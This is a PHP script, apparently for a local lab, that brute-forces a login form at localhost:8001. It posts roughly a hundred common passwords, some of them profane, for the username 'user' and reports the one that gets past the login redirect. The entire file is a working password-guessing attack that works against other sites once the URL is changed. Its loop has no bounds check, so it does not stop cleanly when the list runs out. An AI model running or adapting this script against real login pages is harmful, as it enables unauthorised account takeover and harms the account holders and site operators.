<?php

// Set the URL
$url = "http://localhost:8001/login.php";

$passwords = [
    "123456",
    "password",
    "12345678",
    "qwerty",
    "123456789",
    "12345",
    "1234",
    "111111",
    "1234567",
    "dragon",
    "123123",
    "baseball",
    "abc123",
    "football",
    "monkey",
    "letmein",
    "696969",
    "shadow",
    "master",
    "666666",
    "qwertyuiop",
    "123321",
    "mustang",
    "1234567890",
    "michael",
    "654321",
    "pussy",
    "superman",
    "1qaz2wsx",
    "7777777",
    "fuckyou",
    "121212",
    "000000",
    "qazwsx",
    "123qwe",
    "killer",
    "trustno1",
    "jordan",
    "jennifer",
    "zxcvbnm",
    "asdfgh",
    "hunter",
    "buster",
    "soccer",
    "harley",
    "batman",
    "andrew",
    "tigger",
    "sunshine",
    "iloveyou",
    "fuckme",
    "2000",
    "charlie",
    "robert",
    "thomas",
    "hockey",
    "ranger",
    "daniel",
    "starwars",
    "klaster",
    "112233",
    "george",
    "asshole",
    "computer",
    "michelle",
    "jessica",
    "pepper",
    "1111",
    "zxcvbn",
    "555555",
    "11111111",
    "131313",
    "freedom",
    "777777",
    "pass",
    "fuck",
    "maggie",
    "159753",
    "aaaaaa",
    "ginger",
    "princess",
    "joshua",
    "cheese",
    "amanda",
    "summer",
    "love",
    "ashley",
    "6969",
    "nicole",
    "chelsea",
    "biteme",
    "matthew",
    "access",
    "yankees",
    "987654321",
    "dallas",
    "austin",
    "thunder",
    "taylor",
    "matrix",
    "minecraft"
];

$index = 0;
while (1) {
    $data= array(
        'username' => 'user',
        'password' => $passwords[$index],
    );

    // Create a cURL handle
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, $url);

    // Set the option to follow redirects
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);

    // Set the option to return the transfer as a string
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    // Set the request method to POST
    curl_setopt($ch, CURLOPT_POST, true);

    // Set the query parameters
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));

    // Execute the request
    $response = curl_exec($ch);

    // Get the final URL
    $finalUrl = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);

    // Close the cURL handle
    curl_close($ch);

    if ($finalUrl == "http://localhost:8001/login.php") {
        echo 'try ' . $data["password"];
    } else {
        echo 'usernmae: ' . $data["username"] . " password: " . $data["password"] . 'is valid';

        break;
    }

    echo "\n";

    $index += 1;
}


?>